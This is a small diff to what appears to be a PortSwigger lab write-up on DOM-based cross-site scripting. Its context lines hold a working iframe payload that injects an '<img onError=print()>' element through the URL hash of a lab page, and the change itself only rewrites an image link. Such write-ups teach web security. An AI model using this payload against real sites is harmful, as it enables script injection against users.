@@ -19,7 +19,7 @@ the `iframe`’s `src` attribute points to the vulnerable page with an empty has
 <iframe src="https://0a63007904e71eb080612b3800ab000f.web-security-academy.net/#" onload="this.src+='<img src=x onError=print()>' "> </iframe>
 ```
 
-![](../images/4b886ff1713c_001.png)
+![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/images/4b886ff1713c_001.png)
 
 ### Why It Works
 
